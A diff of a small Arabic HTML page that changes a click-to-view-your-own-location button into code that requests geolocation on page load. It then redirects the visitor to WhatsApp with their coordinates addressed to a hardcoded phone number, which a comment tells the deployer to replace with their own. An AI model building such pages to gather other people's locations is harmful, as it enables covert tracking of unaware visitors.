@@ -1,29 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>Location</title>
+<title>إرسال الموقع</title>
 </head>
 <body style="text-align:center;margin-top:50px;font-size:18px">
 
-<button onclick="getLocation()">اضغط لتحديد الموقع</button>
-<p id="loc"></p>
+<h3>جاري تحديد الموقع…</h3>
 
 <script>
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(
-    function(pos) {
-      let lat = pos.coords.latitude;
-      let lon = pos.coords.longitude;
-      document.getElementById("loc").innerHTML =
-        `<a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">
-        افتح الموقع على الخريطة</a>`;
-    },
-    function() {
-      document.getElementById("loc").innerHTML = "لم يتم السماح بالموقع";
-    }
-  );
-}
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    let lat = pos.coords.latitude;
+    let lon = pos.coords.longitude;
+
+    let msg = 
+      "موقعي الحالي:\n" +
+      "https://maps.google.com/?q=" + lat + "," + lon;
+
+    let phone = "201122127606"; // ← حط رقمك بدون +
+
+    let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(msg);
+
+    window.location.href = url;
+  },
+  function() {
+    document.body.innerHTML = "لم يتم السماح بمشاركة الموقع";
+  }
+);
 </script>
 
 </body>
